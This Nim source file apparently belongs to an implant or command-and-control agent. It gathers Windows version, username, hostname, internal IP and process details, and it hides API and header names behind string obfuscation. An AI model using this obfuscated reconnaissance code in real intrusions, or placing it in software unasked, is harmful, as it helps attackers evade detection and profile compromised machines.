from nativesockets import getHostName, gethostbyname
from os import getCurrentProcessId, splitPath, getAppFilename
import winlean
import ../commands/whoami
import strenc

# https://github.com/nim-lang/Nim/issues/11481
type
  USHORT = uint16
  WCHAR = distinct int16
  UCHAR = uint8
  NTSTATUS = int32

type OSVersionInfoExW {.importc: obf("OSVERSIONINFOEXW"), header: obf("<windows.h>").} = object
  dwOSVersionInfoSize: ULONG
  dwMajorVersion: ULONG
  dwMinorVersion: ULONG
  dwBuildNumber: ULONG
  dwPlatformId: ULONG
  szCSDVersion: array[128, WCHAR]
  wServicePackMajor: USHORT
  wServicePackMinor: USHORT
  wSuiteMask: USHORT
  wProductType: UCHAR
  wReserved: UCHAR

# Import the rtlGetVersion API from NTDll
proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
  {.cdecl, importc: obf("RtlGetVersion"), dynlib: obf("ntdll.dll").}

# Get Windows build based on rtlGetVersion
proc getWindowsVersion*() : string =
    var
        versionInfo: OSVersionInfoExW

    discard rtlGetVersion(versionInfo)
    var vInfo = obf("Windows ") & $versionInfo.dwMajorVersion & obf(" build ") & $versionInfo.dwBuildNumber
    result = vInfo

# Get the username
proc getUsername*() : string = 
    result = whoami()

# Get the hostname
proc getHost*() : string = 
    result = getHostName()

# Get the internal IP
proc getIntIp*() : string =
    result = $gethostbyname(getHost()).addrList[0]

# Get the current process ID
proc getProcId*() : int =
    result = getCurrentProcessId()

# Get the current process name
proc getProcName*() : string =
    splitPath(getAppFilename()).tail